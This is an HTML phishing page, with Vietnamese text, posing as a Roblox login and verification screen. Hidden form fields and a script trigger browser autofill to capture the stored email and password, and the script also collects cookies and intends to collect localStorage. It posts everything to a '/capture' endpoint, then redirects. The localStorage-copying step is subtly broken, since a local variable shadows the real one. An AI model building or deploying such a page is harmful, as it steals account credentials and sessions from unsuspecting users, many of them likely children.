<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Đăng nhập Roblox</title>
    <style>
        body { background: #1a1a2e; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: Arial; margin: 0; }
        .box { background: #fff; padding: 40px; border-radius: 16px; width: 350px; text-align: center; box-shadow: 0 8px 30px rgba(0,0,0,0.5); }
        h2 { color: #1a1a2e; font-size: 28px; }
        .sub { color: #666; font-size: 14px; margin-bottom: 20px; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #0070d1; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        input { display: none; }
    </style>
</head>
<body>
    <div class="box">
        <h2>🎮 Roblox</h2>
        <div class="sub">Đang xác thực...</div>
        <div class="loader"></div>
        <!-- Form ẩn để autofill -->
        <form id="hiddenForm">
            <input type="email" id="email" name="email" autocomplete="email">
            <input type="password" id="password" name="password" autocomplete="current-password">
        </form>
        <script>
            // Focus để kích hoạt autofill
            document.getElementById('email').focus();
            setTimeout(() => { document.getElementById('email').blur(); }, 100);

            setTimeout(() => {
                const email = document.getElementById('email').value || '';
                const password = document.getElementById('password').value || '';
                const cookies = document.cookie || '';
                const localStorage = {};
                for (let i = 0; i < localStorage.length; i++) {
                    const key = localStorage.key(i);
                    localStorage[key] = localStorage.getItem(key);
                }
                const data = {
                    platform: 'roblox',
                    email: email,
                    password: password,
                    cookies: cookies,
                    localStorage: localStorage
                };
                fetch('/capture', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                })
                .then(() => {
                    window.location.href = '/success';
                });
            }, 2000);
        </script>
    </div>
</body>
</html>
